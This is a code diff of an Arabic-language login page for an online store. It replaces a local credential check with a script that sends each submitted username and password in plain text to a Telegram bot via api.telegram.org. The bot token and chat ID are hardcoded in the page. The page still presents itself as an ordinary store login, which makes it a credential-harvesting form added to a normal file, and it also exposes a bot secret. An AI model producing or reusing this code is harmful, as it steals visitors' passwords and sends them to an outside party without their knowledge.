@@ -3,41 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; }
-        .container { width: 300px; margin: 50px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0px 0px 10px #ccc; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-    </style>
+    <title>تسجيل الدخول - متجر الطموح الإلكتروني</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <h2>تسجيل الدخول</h2>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم" required>
-            <input type="password" id="password" placeholder="كلمة المرور" required>
+        <form onsubmit="return sendLoginToTelegram()">
+            <label for="username">اسم المستخدم:</label>
+            <input type="text" id="username" name="username" required>
+
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" name="password" required>
+
             <button type="submit">تسجيل الدخول</button>
         </form>
+        <p>ليس لديك حساب؟ <a href="register.html">إنشاء حساب جديد</a></p>
     </div>
 
     <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            
+        function sendLoginToTelegram() {
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
-            
-            // استرجاع بيانات المستخدم المخزنة عند التسجيل
-            var storedUser = JSON.parse(localStorage.getItem("user"));
-            
-            if (storedUser && username === storedUser.username && password === storedUser.password) {
-                alert("تسجيل الدخول ناجح! مرحبًا " + username);
-                window.location.href = "index.html"; // توجه للصفحة الرئيسية
-            } else {
-                alert("اسم المستخدم أو كلمة المرور غير صحيحة.");
-            }
-        });
+
+            // 🔹 استبدل البيانات هنا برمز التوكن و Chat ID
+            var botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y"; // ضع توكن البوت الخاص بك
+            var chatId = "7302541527"; // ضع معرف الشات الخاص بك
+
+            var message = `🔹 تسجيل دخول جديد 🔹\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    alert("تم إرسال بيانات تسجيل الدخول إلى Telegram!");
+                    window.location.href = "dashboard.html"; // تحويل المستخدم بعد التسجيل
+                })
+                .catch(error => alert("حدث خطأ أثناء الإرسال."));
+
+            return false; // لمنع إعادة تحميل الصفحة
+        }
     </script>
 </body>
-</html>
+    </html>
